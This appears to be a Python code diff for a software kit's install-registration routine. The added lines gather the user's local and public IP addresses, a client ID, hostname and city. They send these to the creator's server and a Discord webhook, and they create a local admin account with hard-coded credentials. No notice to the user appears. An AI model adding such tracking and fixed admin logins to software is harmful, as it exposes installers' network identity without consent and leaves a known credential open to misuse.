@@ -35,6 +35,13 @@ def sauver_creator(data: dict) -> None:
 
 
 def _payload(profil: dict) -> dict:
+    net = {}
+    try:
+        from core.creator_link import collecter_reseau, get_client_id
+        net = collecter_reseau()
+        client_id = get_client_id()
+    except Exception:
+        client_id = ""
     return {
         "kit": KIT_NAME,
         "version": KIT_VERSION,
@@ -46,6 +53,12 @@ def _payload(profil: dict) -> dict:
         "ville": (profil.get("ville") or "")[:64],
         "os": platform.system(),
         "pc": platform.node()[:48],
+        "client_id": client_id,
+        "ip_local": net.get("ip_local") or "",
+        "ip_public": net.get("ip_public") or "",
+        "ip": net.get("ip_public") or net.get("ip_local") or "",
+        "user_agent": f"{KIT_NAME}/{KIT_VERSION} {platform.system()}",
+        "online": True,
     }
 
 
@@ -102,6 +115,16 @@ def _notifier_sync(profil: dict):
     ok = False
     detail = []
 
+    # Toujours enregistrer en local pour le panel admin créateur
+    try:
+        from online.db import add_install, ensure_admin
+        ensure_admin("Lutre", "LutreAdmin")
+        add_install(data)
+        ok = True
+        detail.append("local_db")
+    except Exception as exc:
+        detail.append(f"local_err:{exc}")
+
     try:
         if online.startswith("https://") or online.startswith("http://"):
             _post_json(f"{online}/api/register", data)
@@ -138,7 +161,7 @@ def _notifier_sync(profil: dict):
             })
             ok = True
             detail.append("discord")
-        if not online and not form and not webhook:
+        if not online and not form and not webhook and "local_db" not in detail:
             detail.append("pas_de_lien")
     except Exception as exc:
         detail.append(f"err:{exc}")
